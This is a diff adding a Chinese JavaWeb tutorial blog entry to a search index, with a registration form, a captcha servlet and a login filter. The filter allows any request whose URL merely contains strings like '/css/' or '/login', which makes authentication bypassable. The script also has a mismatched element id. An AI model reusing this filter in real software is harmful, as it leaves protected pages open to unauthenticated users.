+                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password_err&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;err_msg&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: none&quot;</span>&gt;</span>密码格式有误<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
+                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
+
+
+            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>验证码<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputs&quot;</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;checkCode&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checkCode&quot;</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checkCodeImg&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/checkCode&quot;</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;changeImg&quot;</span>&gt;</span>看不清？<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;buttons&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;注 册&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;reg_btn&quot;</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">br</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clear&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
+<span class="javascript">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;changeImgg&quot;</span>).onclick = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span>
+<span class="javascript">        <span class="hljs-comment">//路径后面添加时间戳的目的是避免浏览器进行缓存静态资源</span></span>
+<span class="javascript">        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;checkCodeImg&quot;</span>).src = <span class="hljs-string">&quot;/checkCode?&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().getMilliseconds();</span>
+    &#125;
+<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+
+<h3 id="验证码模块"><a href="#验证码模块" class="headerlink" title="验证码模块"></a>验证码模块</h3><p>借助验证码生成工具</p>
+<p>在<code>src/main/java/com/itheima/util</code>引入生成验证码的类</p>
+<p>将验证码显示在页面上</p>
+<p>在<code>src/main/java/com/itheima/servler/web</code>创建CheckCodeServlet</p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;
+
+<span class="hljs-keyword">import</span> com.itheima.service.BrandService;
+
+<span class="hljs-keyword">import</span> com.itheima.util.CheckCodeUtil;
+
+<span class="hljs-keyword">import</span> javax.servlet.ServletException;
+<span class="hljs-keyword">import</span> javax.servlet.ServletOutputStream;
+<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;
+<span class="hljs-keyword">import</span> java.io.IOException;
+
+<span class="hljs-meta">@WebServlet(value = &quot;/checkCode&quot;)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CheckCodeServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
+    <span class="hljs-comment">// 因为BrandService可能多次用到 所以变成成员变量 减少创建的次数</span>
+    <span class="hljs-keyword">private</span> BrandService brandService = <span class="hljs-keyword">new</span> BrandService();
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+
+        <span class="hljs-comment">// 生成验证码</span>
+        <span class="hljs-comment">// 获取响应输出流</span>
+        ServletOutputStream os = response.getOutputStream();
+        <span class="hljs-comment">// 生成验证码图片显示在jsp页面上</span>
+        String checkCode = CheckCodeUtil.outputVerifyImage(<span class="hljs-number">100</span>, <span class="hljs-number">50</span>, os, <span class="hljs-number">4</span>);
+
+        <span class="hljs-comment">// 将生成的验证码信息发送到 /register 用于验证用户输入的验证码是否正确</span>
+        <span class="hljs-comment">// 将验证码存入session</span>
+        HttpSession codeSession = request.getSession();
+        codeSession.setAttribute(<span class="hljs-string">&quot;checkCode&quot;</span>, checkCode);
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+        doGet(request, response);
+    &#125;
+&#125;</code></pre>
+
+<h3 id="权限验证"><a href="#权限验证" class="headerlink" title="权限验证"></a>权限验证</h3><p>使用javaweb的三大组件 <code>filer</code>实现</p>
+<p>在<code>src/main/java/com/itheima/servler/web/filter</code>中创建<code>LoginFilter</code></p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.web.filter;
+
+<span class="hljs-keyword">import</span> javax.servlet.*;
+<span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;
+<span class="hljs-keyword">import</span> java.io.IOException;
+
+<span class="hljs-comment">//@WebFilter(&quot;/*&quot;)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+        <span class="hljs-comment">// 放行登录相关的资源</span>
+        String urls[] = &#123;<span class="hljs-string">&quot;/login.jsp&quot;</span>, <span class="hljs-string">&quot;/css/&quot;</span>, <span class="hljs-string">&quot;/imgs/&quot;</span>, <span class="hljs-string">&quot;register.jsp&quot;</span>,<span class="hljs-string">&quot;/checkCode&quot;</span>,<span class="hljs-string">&quot;/register&quot;</span>,<span class="hljs-string">&quot;/login&quot;</span>&#125;;
+
+        HttpServletRequest req = (HttpServletRequest) request;
+        StringBuffer requestURL = req.getRequestURL();
+        String url = requestURL.toString();
+        <span class="hljs-keyword">for</span>(String u :urls )&#123;
+            <span class="hljs-keyword">if</span>(url.contains(u))&#123;
+                chain.doFilter(request,response);
+                <span class="hljs-keyword">return</span> ;
+            &#125;
+
+        &#125;
+
+        HttpSession session = req.getSession();
+        Object user = session.getAttribute(<span class="hljs-string">&quot;user&quot;</span>);
+        <span class="hljs-keyword">if</span>(user != <span class="hljs-keyword">null</span>)&#123;
+            chain.doFilter(request, response);
+        &#125;<span class="hljs-keyword">else</span> &#123;
+
+            request.setAttribute(<span class="hljs-string">&quot;login_msg&quot;</span>, <span class="hljs-string">&quot;您尚未登录！&quot;</span>);
+            request.getRequestDispatcher(<span class="hljs-string">&quot;/login.jsp&quot;</span>).forward(req, response);
+        &#125;
+
+    &#125;
+&#125;
+</code></pre>
+
+]]></content>
+      <categories>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>mybatis</tag>
+        <tag>servlet</tag>
+      </tags>
   </entry>
   <entry>
     <title>mycms</title>
